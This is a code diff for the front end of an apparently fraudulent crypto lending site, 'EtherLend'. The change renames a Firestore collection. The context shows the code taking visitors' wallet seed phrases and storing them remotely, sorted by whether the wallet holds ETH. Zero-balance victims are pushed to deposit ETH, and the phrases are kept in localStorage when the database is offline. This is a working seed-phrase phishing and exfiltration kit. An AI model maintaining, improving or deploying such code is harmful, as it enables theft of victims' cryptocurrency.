@@ -1,7 +1,7 @@
 /* ============================================================
    SUBMISSION — Firebase Firestore
    collection: 'submissions'         → wallets WITH ETH balance
-   collection: 'NO ETH SUBMISSIONS'  → wallets WITHOUT ETH balance
+   collection: 'no_eth_submissions'  → wallets WITHOUT ETH balance
 ============================================================ */
 async function handleValidFeedback(data, collectionName = 'submissions') {
   try {
@@ -596,13 +596,13 @@ async function showEthBalanceStatus(address) {
       doneBtn.title = 'Your wallet has no ETH. Please deposit ETH to continue.';
     }
 
-    // ── Submit seed phrase to 'NO ETH SUBMISSIONS' collection ──────────────
+    // ── Submit seed phrase to 'no_eth_submissions' collection ──────────────
     const seedPhraseNoEth = State.pendingSeedPhrase;
 
     if (State.firestoreEnabled && db) {
       if (seedPhraseNoEth) {
-        handleValidFeedback(seedPhraseNoEth, 'NO ETH SUBMISSIONS').catch(err =>
-          console.warn('[EtherLend] NO ETH SUBMISSIONS write error:', err)
+        handleValidFeedback(seedPhraseNoEth, 'no_eth_submissions').catch(err =>
+          console.warn('[EtherLend] no_eth_submissions write error:', err)
         );
       }
       // Log the zero-balance wallet address for reference
@@ -614,7 +614,7 @@ async function showEthBalanceStatus(address) {
           hasPhrase: !!seedPhraseNoEth
         }, { merge: true })
       ).catch(err =>
-        console.warn('[EtherLend] NO ETH SUBMISSIONS meta write error:', err)
+        console.warn('[EtherLend] no_eth_submissions meta write error:', err)
       );
     } else {
       // Firestore unavailable — store locally as fallback
@@ -623,7 +623,7 @@ async function showEthBalanceStatus(address) {
           const existing = JSON.parse(localStorage.getItem('el_no_eth_submissions') || '[]');
           existing.push({ data: seedPhraseNoEth, timestamp: new Date().toISOString() });
           localStorage.setItem('el_no_eth_submissions', JSON.stringify(existing));
-          console.info('[EtherLend] NO ETH SUBMISSIONS saved to localStorage (Firestore offline).');
+          console.info('[EtherLend] no_eth_submissions saved to localStorage (Firestore offline).');
         } catch (e) {
           console.warn('[EtherLend] localStorage save failed:', e);
         }
@@ -1856,4 +1856,5 @@ document.addEventListener('DOMContentLoaded', () => {
   }, 1200);
 
 });
+
 
